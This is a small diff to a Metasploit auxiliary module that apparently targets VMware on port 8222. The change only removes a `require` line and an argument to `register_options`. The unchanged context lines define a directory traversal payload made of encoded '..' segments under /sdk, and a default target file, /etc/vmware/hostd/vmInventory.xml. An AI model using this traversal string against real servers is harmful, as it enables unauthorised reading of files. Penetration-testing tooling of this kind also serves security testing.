@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
 
   # Exploit mixins should be called first
@@ -38,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8222),
         OptString.new('FILE', [ true,  "The file to view", '/etc/vmware/hostd/vmInventory.xml']),
         OptString.new('TRAV', [ true,  "Traversal Depth", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E']),
-      ], self.class)
+      ])
   end
 
   def run_host(target_host)
